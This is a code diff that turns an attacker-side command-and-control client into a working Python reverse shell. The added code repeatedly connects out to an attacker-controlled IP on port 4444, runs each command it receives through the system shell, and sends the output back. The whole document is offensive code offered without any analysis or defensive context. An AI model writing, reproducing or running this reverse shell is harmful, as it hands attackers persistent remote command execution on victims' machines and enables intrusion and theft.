@@ -1,23 +1,39 @@
-# server_c2_connect.py (Attacker Side)
 import socket
+import subprocess
+import time
+import os
 
-TARGET_IP = 'VICTIM_IP_HERE'
-PORT = 4444
+SERVER_IP = '192.168.1.5'  # 🔧 Change this to your attacker's IP
+PORT = 4444                # Must match your server's PORT
 
-def main():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((TARGET_IP, PORT))
-    print(f"[+] Connected to {TARGET_IP}:{PORT}")
-
+def connect():
     while True:
-        cmd = input("$ ")
-        if cmd.lower() in ['exit', 'quit']:
+        try:
+            s = socket.socket()
+            s.connect((SERVER_IP, PORT))
+            shell(s)
+        except Exception as e:
+            time.sleep(5)  # Wait before retrying connection
+
+def shell(s):
+    while True:
+        try:
+            command = s.recv(1024).decode().strip()
+            if command.lower() == 'exit':
+                break
+
+            if command:
+                output = subprocess.run(command, shell=True, capture_output=True, text=True)
+                result = output.stdout + output.stderr
+                s.send(result.encode() if result else b'[+] Command executed with no output.\n')
+        except Exception as e:
+            try:
+                s.send(f"[!] Error: {str(e)}\n".encode())
+            except:
+                pass
             break
-        s.send(cmd.encode())
-        data = s.recv(4096).decode()
-        print(data, end="")
 
     s.close()
 
 if __name__ == "__main__":
-    main()
+    connect()
